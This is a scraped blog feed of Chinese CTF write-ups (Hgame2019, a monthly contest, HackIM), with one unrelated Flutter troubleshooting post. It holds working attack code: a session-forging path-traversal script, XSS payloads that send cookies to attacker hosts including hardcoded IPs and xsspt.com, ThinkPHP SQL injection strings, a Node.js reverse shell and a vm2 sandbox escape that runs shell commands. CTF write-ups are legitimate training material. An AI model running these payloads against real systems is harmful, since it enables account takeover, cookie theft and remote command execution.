\u0026#34;username\u0026#34;:\u0026#34;ii5am3\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;123456\u0026#34;, \u0026#34;confirmpass\u0026#34;:\u0026#34;123456\u0026#34;,} r = req.post(registerURL,data=registerData) print(\u0026#34;[+] register \u0026#34;+r.text) # login loginData={ \u0026#34;username\u0026#34;:\u0026#34;ii5am3\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;123456\u0026#34;,} r = req.post(loginURL,data=loginData) print(r\u0026#34;[+] login \u0026#34;+r.text) # è·å–å½“å‰ç™»é™†ç”¨æˆ·çš„sessionID sessionID = r.request._cookies._cookies[ip][\u0026#34;/\u0026#34;][\u0026#34;PHPSESSID\u0026#34;].value print(r\u0026#34;[+] sessionID is \u0026#34;+ sessionID) # ä¸Šä¼ sessionï¼Œä¼ªé€ cookie newSession = sessionID[0:2]+\u0026#34;5am3\u0026#34; filename = \u0026#34;../../tmp/%s/%s/%s\u0026#34; %(sessionID[0],sessionID[1],newSession) # æœ¬åœ°æ­å»ºç¯å¢ƒï¼Œç™»å…¥uidä¸º1çš„è´¦å·ï¼Œç„¶åè·å–ä»–çš„sessionçš„æ–‡ä»¶å³å¯ã€‚åœ¨è¿™é‡Œæˆ‘ç»™å¤§å®¶ attackSession = base64.b64decode(\u0026#34;Dv+BBAEC/4IAARABEAAAGv+CAAEGc3RyaW5nDAUAA3VpZANpbnQEAgAC\u0026#34;) sessionFiles={\u0026#34;uploadname\u0026#34; : (filename, attackSession)} r = req.post(userinfoURL,files=sessionFiles) print(r\u0026#34;[+] newCookie is: PHPSESSID=\u0026#34;+ newSession) ä¼ªé€ æœåŠ¡ç«¯è„šæœ¬ï¼š\n# coding:utf-8 import requests import base64 # reqè¡¨ç¤ºuser1ï¼Œæ­¤æ—¶å…¨ç¨‹ç”¨è¯¥ä¸€ä¸ªsession req = requests.session() ip = \u0026#34;94.191.10.201\u0026#34; host = \u0026#34;http://94.191.10.201:7000\u0026#34; registerURL = host + \u0026#34;/auth/register\u0026#34; loginURL= host + \u0026#34;/auth/login\u0026#34; userinfoURL = host + \u0026#34;/userinfo\u0026#34; deleteUserURL = host +\u0026#34;/admin/user/del/2\u0026#34; installURl = host + \u0026#34;/install\u0026#34; attackCookie = base64.b64decode(\u0026#34;Dv+BBAEC/4IAARABEAAAGv+CAAEGc3RyaW5nDAUAA3VpZANpbnQEAgAC\u0026#34;) # register registerData={ \u0026#34;username\u0026#34;:\u0026#34;ii5am3\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;123456\u0026#34;, \u0026#34;confirmpass\u0026#34;:\u0026#34;123456\u0026#34;,} r= req.post(registerURL,data=registerData) print(\u0026#34;[+] register \u0026#34;+r.text) # login loginData={ \u0026#34;username\u0026#34;:\u0026#34;ii5am3\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;123456\u0026#34;,} r = req.post(loginURL,data=loginData) print(r\u0026#34;[+] login \u0026#34;+r.text) sessionID= r.request._cookies._cookies[ip][\u0026#34;/\u0026#34;][\u0026#34;PHPSESSID\u0026#34;].value print(r\u0026#34;[+] sessionID is \u0026#34;+ sessionID) # ä¸Šä¼ sessionï¼Œä¼ªé€ cookie newSession = sessionID[0:2]+\u0026#34;5am3\u0026#34; filename = \u0026#34;../../tmp/%s/%s/%s\u0026#34; %(sessionID[0],sessionID[1],newSession) sessionFiles={ \u0026#34;uploadname\u0026#34; : (filename, attackCookie)} r = req.post(userinfoURL,files=sessionFiles) print(r\u0026#34;[+] newSessionID is \u0026#34;+ newSession) # ä¿®æ”¹å¤´åƒæ–‡ä»¶é“¾æ¥ã€‚ sessionFiles={ \u0026#34;uploadname\u0026#34; : (\u0026#34;../../conf/app.conf\u0026#34;, \u0026#34;12345\u0026#34;)} r = req.post(userinfoURL,files=sessionFiles) # æ–°å»ºä¸€ä¸ªè¯·æ±‚ï¼Œä¼ªé€ adminè¿›è¡Œåˆ é™¤ç”¨æˆ· headers={ \u0026#34;Cookie\u0026#34;:\u0026#34;PHPSESSID=\u0026#34;+newSession} r = requests.get(deleteUserURL,headers=headers) # é‡æ–°å®‰è£…ç¯å¢ƒï¼Œå°†å…¶æŒ‡å‘æˆ‘ä»¬çš„æ¶æ„sqlæœåŠ¡å™¨ã€‚ installData = { \u0026#34;host\u0026#34;:\u0026#34;your_ip\u0026#34;, \u0026#34;port\u0026#34;:\u0026#34;your_port\u0026#34;, \u0026#34;username\u0026#34;:\u0026#34;hgame\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;hgame\u0026#34;, \u0026#34;database\u0026#34;:\u0026#34;hgame\u0026#34;} r = requests.post(installURl,installData) # å†æ¬¡ç™»å½•ï¼Œä½¿å…¶å†æ¥ä¸€æ¬¡è¯·æ±‚ã€‚ loginData={ \u0026#34;username\u0026#34;:\u0026#34;ii5am3\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;123456\u0026#34;,} r = req.post(loginURL,data=loginData) print(r\u0026#34;[+] login \u0026#34;+r.text) è¯»å– flag\n \nHappyXSS onerror \u0026#34; \u0026amp; svg onload onerror \u0026#39; éšæ‰‹fuzzäº†ä¸€ä¸‹ï¼Œå‘ç°ä»¥ä¸Šå…³é”®å­—ä¼šè¢«æ›¿æ¢ä¸ºHappy !\n\u0026lt;marquee onstart=alert(1)\u0026gt; \u0026lt;marquee onstart=eval(atob(\u0026#39;YWxlcnQoMSk=\u0026#39;))\u0026gt; \u0026lt;marquee onstart=eval(atob(\u0026#39;some base64 code\u0026#39;))\u0026gt; ç”¨\u0026lt;marquee\u0026gt;è™½ç„¶å¯ä»¥ç»•ï¼Œä½†æ˜¯Chromeä¸æ”¯æŒè¿™ä¸ªæ ‡ç­¾äº†ï¼Œå¯èƒ½è¿™é¢˜ä¹Ÿç”¨çš„æ˜¯Chromelessï¼Œç„¶åå‘ç°è¿˜æœ‰CSPç­–ç•¥ã€‚\nHTTP/1.1 200 OK Date: Fri, 22 Feb 2019 10:32:21 GMT Server: Apache/2.4.29 (Ubuntu) Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Content-Security-Policy: default-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39; \u0026#39;unsafe-eval\u0026#39;; style-src * X-XSS-Protection: 0 Vary: Accept-Encoding Content-Length: 1353 Connection: close Content-Type: text/html; charset=UTF-8 æœ€åæˆ‘ç”¨\u0026lt;body onpageshowè¿›è¡Œäº†ç»•è¿‡\n\u0026lt;body onpageshow=eval(atob(\u0026#39;ZnJhbWU9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaWZyYW1lIik7CmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoZnJhbWUpOwpzY3JpcHQ9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CnNjcmlwdC5zcmM9Jy8veHNzcHQuY29tL0d2eE5Qbic7CndpbmRvdy5mcmFtZXNbMF0uZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChzY3JpcHQpOw==\u0026#39;))\u0026gt; Base64 å†…å®¹ï¼š\nframe=document.createElement(\u0026#34;iframe\u0026#34;); document.body.appendChild(frame); script=document.createElement(\u0026#39;script\u0026#39;); script.src=\u0026#39;//xsspt.com/GvxNPn\u0026#39;; window.frames[0].document.head.appendChild(script); ä½†æ˜¯ä»¥ä¸Šä¸èƒ½ç»•CSPç­–ç•¥ï¼Œå¯ä»¥ç”¨window.locationç»•è¿‡\n\u0026lt;body onpageshow=eval(atob(\u0026#39;d2luZG93LmxvY2F0aW9uPSJodHRwOi8veW91cl9pcDpwb3J0P2M9Iitkb2N1bWVudC5jb29raWU7\u0026#39;))\u0026gt; base64 å†…å®¹ï¼š\nwindow.location=\u0026quot;http://your_ip:port?c=\u0026quot;+document.cookie;  \nå†ç»™å‡ ä¸ªå…¶ä»–å¸ˆå‚…ç»•è¿‡çš„ payload :\nåˆ©ç”¨window.openï¼Œä¸è¿‡ç”¨çš„æ˜¯\u0026lt;script \u0026gt;ç»•è¿‡å…³é”®å­—æ£€æµ‹\n\u0026lt;script\u0026gt;window.open(\u0026#39;http://149.248.6.227:1150/XSS.php?cookie=\u0026#39;+document.cookie)\u0026lt;/script\u0026gt; \u0026lt;script \u0026gt;eval(String.fromCharCode(119,105,110,100,111,119,46,111,112,101,110,40,39,104,116,116,112,58,47,47,49,52,57,46,50,52,56,46,54,46,50,50,55,58,49,49,53,48,47,88,83,83,46,112,104,112,63,99,111,111,107,105,101,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))\u0026lt;/script \u0026gt; è¿˜æœ‰çš„ç”¨\u0026lt;input onfousç»•è¿‡\n\u0026lt;input onfocus=javascript:eval(String.fromCharCode(119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,50,53,48,48,48,47,63,115,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59)); autofocus\u0026gt; ","date":"2019-02-27T23:09:02Z","permalink":"https://blog.zeddyu.info/2019/02/27/Hgame2019/","title":"Hgame2019"},{"content":"åœ¨æˆ‘ä¸€ä¸ªé¡¹ç›®å½“ä¸­ä½¿ç”¨flutter packages get é‡åˆ°äº† HTTP 424 çš„é”™è¯¯ï¼Œæ‰¾äº†å¾ˆå¤šæ–¹æ³•éƒ½æ²¡æœ‰è§£å†³æ–¹æ³•ï¼Œä¸ªäººè§£å†³äº†ä¹‹åå°±æ­¤è®°å½•ä¸‹æ¥ã€‚\né—®é¢˜æè¿° ä½¿ç”¨flutter packages get -væ‰“å°å‡ºæ­¥éª¤é”™è¯¯\n \nå‘ç° 404 é”™è¯¯\nå‘ç°é—®é¢˜ æŒ‰ç…§æç¤ºï¼Œä½¿ç”¨pub --trace --verbosity=warning --verbose get --no-precompileæ‰“å°å‡ºæ›´è¯¦ç»†çš„æ­¥éª¤\n \nå‘ç°è€æ˜¯åœ¨è·å–path_provideer 0.5.0+1è¿™é‡ŒæŠ¥å‡ºäº† 424 çš„é”™è¯¯ï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ä¸æ˜¯é•œåƒå¹¶æ²¡æœ‰è¿™ä¸ªåŒ…ï¼Œè‡ªå·±ä¹Ÿå»pub.flutter-io.cnæ‰¾äº†ä¸€ä¸‹ï¼Œç¡®å®æœ‰path_provideer 0.5.0+1è¿™ä¸ªç‰ˆæœ¬çš„åŒ…ã€‚\nè€Œ HTTP 424 ä»£è¡¨ä»€ä¹ˆå‘¢\n â€‹\t424 Failed Dependency (WebDAV; RFC 4918)\nâ€‹\tThe request failed because it depended on another request and that request failed (e.g., a PROPPATCH).[15]\nâ€‹\tâ€”From List of HTTP status codes\n è¿™é‡Œå°±æ˜¯å­—é¢æ„æ€äº†ï¼Œä¹Ÿå°±æ˜¯è¯´æœ¬æ¬¡è¯·æ±‚å¤±è´¥çš„åŸå› æ˜¯ä¸Šæ¬¡çš„è¯·æ±‚å¤±è´¥äº†ã€‚ç„¶è€Œæœç´¢äº†ç›¸å…³çŸ¥è¯†ï¼Œéƒ½æ²¡æœ‰æ‰¾åˆ°æ–¹æ³•ã€‚\nè§£å†³æ–¹æ¡ˆ ç”±äºæ¯•ç«Ÿæ˜¯ HTTP å‡ºäº†é—®é¢˜ï¼Œé‚£è‚¯å®šæ˜¯ç½‘ç»œçš„é—®é¢˜\n  å°è¯•åˆ‡æ¢ä»£ç†(It works nothing for me)\n  å°è¯•æ›´æ¢é•œåƒæºï¼Œç”±äºè‡ªå·±ä¹‹å‰è®¾å®šçš„æ˜¯\nexport PUB_HOSTED_URL=https://pub.flutter-io.cn export FLUTTER_STORAGE_BASE_URL=https://storage.flutter-io.cn ç”±äºç°åœ¨åœ¨å­¦æ ¡ï¼Œè‡ªå·±æ‰€å¤„çš„ç½‘ç»œç¯å¢ƒå‘ç”Ÿäº†æ”¹å˜ï¼Œæ¯•ç«Ÿæ•™è‚²ç½‘ç»œå†…éƒ¨ä¹‹é—´çš„é€šä¿¡æ¯”è¾ƒå¥½ï¼Œäºæ˜¯åˆ‡æ¢åˆ°äº¤å¤§çš„é•œåƒæºï¼Œé—®é¢˜å¾—åˆ°è§£å†³\nexport PUB_HOSTED_URL=https://dart-pub.mirrors.sjtug.sjtu.edu.cn/ export FLUTTER_STORAGE_BASE_URL=https://mirrors.sjtug.sjtu.edu.cn/  ","date":"2019-02-25T10:25:35Z","permalink":"https://blog.zeddyu.info/2019/02/25/Flutter-424%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/","title":"Flutter packages get 424é—®é¢˜è§£å†³æ–¹æ³•"},{"content":"å®‰æ’1æœˆæœˆèµ›å¤ç°wp\nWeb babygo  babygoï¼ˆæäº¤ä½ æ‰¾åˆ°çš„å­—ç¬¦ä¸²çš„md5å€¼ï¼‰\n é¢˜ç›®æºç \n\u0026lt;?php @error_reporting(1); include \u0026#39;flag.php\u0026#39;; class baby { protected $skyobj; public $aaa; public $bbb; function __construct() { $this-\u0026gt;skyobj = new sec; } function __toString() { if (isset($this-\u0026gt;skyobj)) return $this-\u0026gt;skyobj-\u0026gt;read(); } } class cool { public $filename; public $nice; public $amzing; function read() { $this-\u0026gt;nice = unserialize($this-\u0026gt;amzing); $this-\u0026gt;nice-\u0026gt;aaa = $sth; if($this-\u0026gt;nice-\u0026gt;aaa === $this-\u0026gt;nice-\u0026gt;bbb) { $file = \u0026#34;./{$this-\u0026gt;filename}\u0026#34;; if (file_get_contents($file)) { return file_get_contents($file); } else { return \u0026#34;you must be joking!\u0026#34;; } } } } class sec { function read() { return \u0026#34;it\u0026#39;s so sec~~\u0026#34;; } } if (isset($_GET[\u0026#39;data\u0026#39;])) { $Input_data = unserialize($_GET[\u0026#39;data\u0026#39;]); echo $Input_data; } else { highlight_file(\u0026#34;./index.php\u0026#34;); } ?\u0026gt;æ„Ÿè§‰æ˜¯ä¸€å¶é£˜é›¶å¸ˆå‚…å‡ºçš„é¢˜2333\u0026hellip;è¿˜æ˜¯å­¦ä¹ åˆ°äº†ä¸€ç‚¹çŸ¥è¯†çš„\nè¿™é¢˜è€ƒæŸ¥çš„å°±æ˜¯ PHP å¯¹è±¡æ³¨å…¥ï¼Œ@l3m0n å¸ˆå‚…è¿™ç¯‡å†™çš„æ¯”è¾ƒå¥½ï¼Œå…¶ä»– csdn çš„åšå®¢å†™çš„ç®€ç›´æƒ¨ä¸å¿ç¹ï¼Œphpå¯¹è±¡æ³¨å…¥-popé“¾çš„æ„é€ ï¼Œå…¶å®å…³é”®ç‚¹å°±æ˜¯ååºåˆ—åŒ–å¯ä»¥æ§åˆ¶ç±»å±æ€§ï¼Œæ— è®ºæ˜¯privateè¿˜æ˜¯publicã€‚æˆ‘ä»¬å¯ä»¥åœ¨æœ¬åœ°å…ˆç”Ÿæˆè‡ªå·±éœ€è¦çš„å°±å¥½äº†\nå¦‚ä¸‹ï¼Œç›´æ¥æŠŠ__constructæ–¹æ³•é‡Œé¢çš„æ”¹æˆ$this-\u0026gt;skyobj = new cool;å°±å¯ä»¥è°ƒç”¨ cool-\u0026gt;read()äº†ï¼Œç„¶åç›´æ¥ç”¨$this-\u0026gt;amazing = NULL;ç»•è¿‡$this-\u0026gt;nice-\u0026gt;aaa === $this-\u0026gt;nice-\u0026gt;bbbï¼Œå…¶å®ä¸ä¼ ä¹Ÿå¯ä»¥ï¼Œåæ­£éƒ½æ˜¯NULLï¼Œæ•´ä¸ªé¢˜å°±ç»“æŸäº†\n\u0026lt;?php // @error_reporting(1); // include \u0026#39;flag.php\u0026#39;; class baby { protected $skyobj; public $aaa; public $bbb; function __construct() { $this-\u0026gt;skyobj = new cool; $this-\u0026gt;amazing = NULL; } function __toString() { if (isset($this-\u0026gt;skyobj)) return $this-\u0026gt;skyobj-\u0026gt;read(); } } class cool { public $filename = \u0026#34;flag.php\u0026#34;; public $nice; public $amzing; function read() { echo \u0026#34;Nice!\u0026#34;; $this-\u0026gt;nice = unserialize($this-\u0026gt;amzing); $this-\u0026gt;nice-\u0026gt;aaa = $sth; if($this-\u0026gt;nice-\u0026gt;aaa === $this-\u0026gt;nice-\u0026gt;bbb) { $file = \u0026#34;./{$this-\u0026gt;filename}\u0026#34;; if (file_get_contents($file)) { return file_get_contents($file); } else { return \u0026#34;you must be joking!\u0026#34;; } } } } class sec { function read() { return \u0026#34;it\u0026#39;s so sec~~\u0026#34;; } } $obj = new baby; echo urlencode(serialize($obj)); // $obj-\u0026gt;aaa-\u0026gt;amazing = new baby;  // if (isset($_GET[\u0026#39;data\u0026#39;])) // { // $Input_data = unserialize($_GET[\u0026#39;data\u0026#39;]); // echo $Input_data; // } // else // { // highlight_file(\u0026#34;./test.php\u0026#34;); // } ?\u0026gt;Simple php è®¿é—®robots.txtå‘ç°æœ‰åå°\nUser-agent: * Disallow: /ebooks Disallow: /admin Disallow: /xhtml/? Disallow: /center è®¿é—®adminï¼Œä½¿ç”¨admin/12345678æˆåŠŸç™»å½•ï¼Œç™»å½•åæœ‰ä¸€ä¸ªæœç´¢åŠŸèƒ½\n \nç»“åˆé¡µé¢thinkphp 3.2çš„æ¡†æ¶æ¼æ´ï¼Œä½¿ç”¨ä»¥ä¸‹ payload é€æ¸è·å¾— flag\nsearch[where]=3and1=updatexml(1,concat(0x7,(selectschema_namefrominformation_schema.schematalimit3,1),0x7e),1);%23search[where]=3and1=updatexml(1,concat(0x7,(selectgroup_concat(table_name)frominformation_schema.tableswheretable_schema=\u0026#39;tpctf\u0026#39;),0x7e),1);%23search[where]=3and1=updatexml(1,concat(0x7,(selectgroup_concat(flag)fromflag),0x7e),1);%23search[where]=3and1=updatexml(1,concat(0x7,(selectflagfromflaglimit0,1),0x7e),1);%23search[where]=3and1=updatexml(1,concat(0x3a,(selectflagfromflaglimit0,1)),1);%23search[where]=3andextractvalue(1,concat(0x5c,(selectflagfromflaglimit0,1)));%23search[where]=3and(select1from(selectcount(),concat((select(select(selectflagfromflaglimit0,1))frominformation_schema.tableslimit0,1),floor(rand(0)2))xfrominformation_schema.tablesgroupbyx)a);%23search[where]=3and(select1from(selectcount(*),concat((select(select(SELECTconcat(0x7,flag,0x7e)FROMflaglimit0,1))frominformation_schema.tableslimit0,1),floor(rand(0)*2))xfrominformation_schema.tablesgroupbyx)a);%23select1from(selectcount(*),concat((select(select(SELECTconcat(0x7,flag,0x7e)FROMflaglimit0,1))frominformation_schema.tableslimit0,1),floor(rand(0)*2))xfrominformation_schema.tablesgroupbyx)a \n \n \n \nç»“æœå‘ç°æäº¤ä¸å¯¹ï¼Œç„¶åçœ‹äº†å…¶ä»–å¸ˆå‚…çš„ wp å‘ç°å°‘äº†ä¸€ä½ï¼Œç„¶åæœäº†ä¸€ä¸‹ç›¸å…³èµ„æ–™ï¼Œåº”è¯¥æ˜¯é™åˆ¶äº†è¾“å‡º\nå°è¯•äº†å¾ˆå¤šï¼Œä¹Ÿç”¨äº†floorå°è¯•æŠ¥é”™æ³¨å…¥ä¸é™åˆ¶è¾“å‡ºï¼Œä½†æ˜¯ç”¨flooræœ¬åœ°æˆåŠŸäº†ï¼Œä½†æ˜¯ä¸€æ‰“æœåŠ¡å°± pending äº†ï¼Œå¾ˆæ˜¯éƒé—·ï¼Œæœ€åç”¨substr(str,32,1)å¾—åˆ°äº†æœ€åçš„ä¸€ä¸ªæ•°6\nsearch[where]=3andextractvalue(1,concat(0x5c,substr((selectflagfromflaglimit0,1),32,1)));%23è´´ä¸€ä¸‹è„šæœ¬ï¼š\nimport HackRequests as hack url = \u0026#34;http://101.71.29.5:10010/Admin/User/Index?search[where]=3%20and%20extractvalue(1,concat(0x5c,substr((select%20flag%20from%20flag%20limit%200,1),32,1)));%23\u0026#34; loginurl = \u0026#34;http://101.71.29.5:10010/admin/index/login\u0026#34; # hh = hack.httpraw(raw) header = \u0026#39;\u0026#39;\u0026#39; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Pragma: no-cache Cache-Control: no-cache Cookie: PHPSESSID=6qm8l5phgs6hkva4fpndkp1p70; path=/ \u0026#39;\u0026#39;\u0026#39; proxy = (\u0026#39;185.32.44.22\u0026#39;,\u0026#39;80\u0026#39;) user = \u0026#34;user=admin\u0026amp;password=12345678\u0026#34; # hh = hack.http(loginurl,headers=header,proxy=proxy,post=user) hh = hack.http(url,headers=header,proxy=proxy) print(hh.header) print(hh.text()) é¡ºä¾¿æä¸€ä¸‹ï¼Œè¿™ä¸ªç™»å½•æˆ‘çœ‹å…¶ä»–å¸ˆå‚… wp æ˜¯é€šè¿‡ sql çº¦æŸæ”»å‡»ç™»å½• admin è´¦æˆ·çš„â€¦å¹¶éå¼±å£ä»¤ï¼Œæˆ‘çŒœ sql è¯­å¥åº”è¯¥æ˜¯\nselect*fromuserswhereusername=\u0026#34;xxx\u0026#34;andpassowrd=\u0026#34;xxx\u0026#34;è€Œä¸”æ³¨å†Œå¯†ç æ˜¯8ä½æ•°çš„è¯ï¼Œè‚¯å®šåº”è¯¥æœ‰å¸ˆå‚…æ˜¯å¼„çš„ 12345678 â€¦2333\n","date":"2019-02-24T01:07:49Z","permalink":"https://blog.zeddyu.info/2019/02/24/%E5%AE%89%E6%81%921%E6%9C%88%E6%9C%88%E8%B5%9B/","title":"å®‰æ’1æœˆæœˆèµ›"},{"content":" â€‹\tæ–‡ç« é¦–å‘äºå®‰å…¨å®¢ï¼Œåœ°å€ï¼šhttps://www.anquanke.com/post/id/170708\n è¿‡å¹´å‰åšäº†ä¸€ä¸‹ï¼Œæ„Ÿè§‰è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ã€‚æ¯”èµ›å®˜æ–¹ä¹Ÿå¼€æºäº†æ¯”èµ›æºç ã€‚\n[TOC]\nWeb BabyJS  â€‹\tRun your javascript code inside this page and preview it because of hackers we have only limited functions\n  \né¢˜ç›®å†…å®¹å¦‚ä¸Šï¼Œæ¯”è¾ƒç®€å•çš„ javascript ä»£ç è¿è¡Œï¼Œåå°æ˜¯ Node.js\nè¿™é‡Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘ä¸€ä¸‹æ˜¯ä¸æ˜¯æœ‰ä»€ä¹ˆ Node.js æ²™ç®±é€ƒé€¸ä»€ä¹ˆçš„æ“ä½œï¼Œå›½å†…å¯¹äº Node.js æ²™ç®±é€ƒé€¸çš„æ–‡ç« è¿˜æ˜¯æ¯”è¾ƒå°‘çš„ï¼Œå‚è€ƒäº†å¥½å‡ ç¯‡éƒ½æ˜¯ç¿»è¯‘æ–‡ç« ï¼Œéƒ½ç¿»è¯‘å¾—ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œå‚è€ƒæ–‡ç« ï¼šNodeJSæ²™ç›’é€ƒé€¸ç ”ç©¶\nä½†æ˜¯ä¹Ÿèƒ½çŸ¥é“ä¸ªå¤§æ¦‚ï¼Œè¦æ‰§è¡Œå‘½ä»¤æˆ–è€…åå¼¹ shell å°±éœ€è¦ç”¨åˆ°ä¸¤ä¸ªæ¨¡å—ï¼Œåˆ†åˆ«æ˜¯ net å’Œ child_process ï¼Œå¯ä»¥ç”¨ä»¥ä¸‹ payload ç›´æ¥åå¼¹ shell\n(function () { var net = require(\u0026#34;net\u0026#34;), cp = require(\u0026#34;child_process\u0026#34;), sh = cp.spawn(\u0026#34;/bin/sh\u0026#34;, []); var client = new net.Socket(); client.connect(your_port, \u0026#34;your_ip\u0026#34;, function () { client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; // Prevents the Node.js application form crashing })(); ç„¶è€Œå½“æˆ‘ä»¬æƒ³ç›´æ¥åå¼¹ shell ï¼ˆé‚£å½“ç„¶æ˜¯å¤ªå¤©çœŸäº†ï¼‰ï¼Œå°±è¿”å›äº†not defined\n \næ‰€ä»¥æ²¡é‚£ä¹ˆç®€å•ï¼Œé‚£æˆ‘ä»¬å…ˆä»ä¿¡æ¯æ”¶é›†å¼€å§‹ï¼Œä½¿ç”¨Error().stackå¯ä»¥æ”¶é›†ä½¿ç”¨çš„æ¨¡å—ä¿¡æ¯ï¼Œè€Œä¸”é¢˜ç›®è®¾ç½®æ˜¯å¯ä»¥ç›´æ¥æŠŠå†…å®¹è¾“å‡ºå‡ºæ¥çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸éœ€è¦printï¼Œå¯ä»¥ç›´æ¥è¾“å‡ºä¿¡æ¯ã€‚\næˆ‘ä»¬é¦–å…ˆå…ˆæ”¶é›†ç›®æ ‡ä¿¡æ¯ï¼Œä½¿ç”¨js=Error().stack\n \næˆ‘ä»¬å¯ä»¥å¾—åˆ°é¢˜ç›®è®¾ç½®çš„æ¨¡å—ï¼Œå¦‚vm.jsï¼Œç„¶åå‘ç°å¯¹åº”çš„vm2ä»“åº“é‡Œå·²ç»æœ‰å¾ˆå¤š escape çš„ issue äº†ï¼Œå‘ç°æœ‰ä¸€ä½ @XmiliaH å¤§ä½¬å·²ç» escape äº†å¾ˆå¤šç‰ˆæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä¸€ä¸‹æ¯”è¾ƒæ–°çš„ä¸€ä¸ªç‰ˆæœ¬Breakout in v3.6.9\nvar process; try{ Object.defineProperty(Buffer.from(\u0026#34;\u0026#34;),\u0026#34;\u0026#34;,{ value:new Proxy({},{ getPrototypeOf(target){ if(this.t) throw Buffer.from; this.t=true; return Object.getPrototypeOf(target); } }) }); }catch(e){ process = e.constructor(\u0026#34;return process\u0026#34;)(); } process.mainModule.require(\u0026#34;child_process\u0026#34;).execSync(\u0026#34;ls\u0026#34;).toString() ç›´æ¥ä½œä¸º payload ä½¿ç”¨ï¼Œå‘ç°å¯ä»¥æˆåŠŸæ‰§è¡Œå‘½ä»¤\n \næ¥ä¸‹æ¥ç›´æ¥è¯» flag å°±å¥½äº†ï¼Œå¾—åˆ°\nhackim19{S@ndbox_0_h4cker_1} Blog  â€‹\tIts just a blog\n  \né¢˜ç›®æ˜¯ä¸€ä¸ª Node.js ï¼Œé¢˜ç›®è®¾ç½®æ¯”è¾ƒç®€å•ï¼Œå°±ä¸€ä¸ªè¡¨å•ï¼Œæäº¤ä¹‹åå‚æ•°ä¼šå¾—åˆ°ç›¸åº”çš„é¡µé¢\n \nä»¥åŠè¿˜æœ‰ä¸€ä¸ª admin ç•Œé¢\n \nindex ç•Œé¢è¾“å…¥ä»€ä¹ˆå°±ä»¥ HTML å½¢å¼è¿”å›ä»€ä¹ˆï¼Œä¹Ÿå¯ä»¥è§¦å‘ XSS\n \nä½†æ˜¯è¿™åªæ˜¯ä¸€ä¸ª self-xss ï¼Œè¿™å°±æ˜¾å¾—åˆäº›é¸¡è‚‹äº†ï¼Œæ‰€ä»¥å¤§æ¦‚æ„æ€å°±æ˜¯æˆ‘ä»¬éœ€è¦ç”¨ index åš xss æˆ–è€…å…¶ä»–ä¸€äº›æ“ä½œå»è·å–ç®¡ç†å‘˜æƒé™\nè·Ÿä¸Šé¢˜ä¸€æ ·ï¼Œæ—¢ç„¶éƒ½æ˜¯ Node.js ï¼Œæ˜¯ä¸æ˜¯ä¹Ÿå¯ä»¥å¾—åˆ°ä¸€äº›é”™è¯¯ä¿¡æ¯ä»€ä¹ˆçš„ã€‚\nåœ¨å°è¯•äº†ä¸€äº›å•å¼•å·ã€åŒå¼•å·ç­‰ä¸€äº›ç‰¹æ®Šç¬¦å·ï¼Œå‘ç°ç¡®å®æ˜¯å…¨éƒ¨éƒ½è½¬æ¢æˆ string è¾“å‡ºäº†ï¼ŒçŒœæƒ³æ˜¯ä¸æ˜¯æœ‰ç±»ä¼¼toString()çš„æ“ä½œï¼Œæ¢æˆæ•°ç»„æµ‹è¯•ï¼Œå‘ç°æ— å›æ˜¾ï¼Œä¸€ç›´åœç•™åœ¨ pending çŠ¶æ€ä¸­\n \nå°è¯•ç›´æ¥è®¿é—® /edge é¡µé¢ï¼Œå¾—åˆ°é”™è¯¯ä¿¡æ¯\n \nä½†æ˜¯è¿™éƒ½æ˜¯ç”¨äºå‰ç«¯æ•ˆæœçš„ js åº“ï¼Œå¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œä½†æ˜¯æ€è·¯åº”è¯¥æ˜¯æ²¡é”™çš„ï¼Œç»§ç»­ fuzz å°±è¡Œäº†ã€‚\n \næœ€ç»ˆç”¨title=1\u0026amp;description[a]=1å¾—åˆ°äº†æ¯”è¾ƒæœ‰ç”¨çš„æŠ¥é”™ä¿¡æ¯ï¼Œå¾—åˆ°äº†ä¸€ä¸ªæ–°çš„åº“ esi.js ï¼ŒæŸ¥çœ‹ç›¸å…³èµ„æ–™Node ESI Language parserï¼Œå¯ä»¥çŸ¥é“è¿™æ˜¯ä¸€ä¸ªç”¨äºå¤„ç† ESI è¯­è¨€çš„ js åº“ï¼Œä½¿ç”¨ç¤ºä¾‹å®˜æ–¹ä¹Ÿç»™å‡ºæ¥äº†\n â€‹\tYou want to embed the fragment of HTML from \u0026ldquo;http://snipets.com/abc.html\" within an HTML document.\nblah blah, oh and here i embed in the page a snipet using an ESI server ... \u0026lt;esi:include src=\u0026quot;http://snipets.com/snipet.html\u0026quot;\u0026gt;\u0026lt;/esi:include\u0026gt; 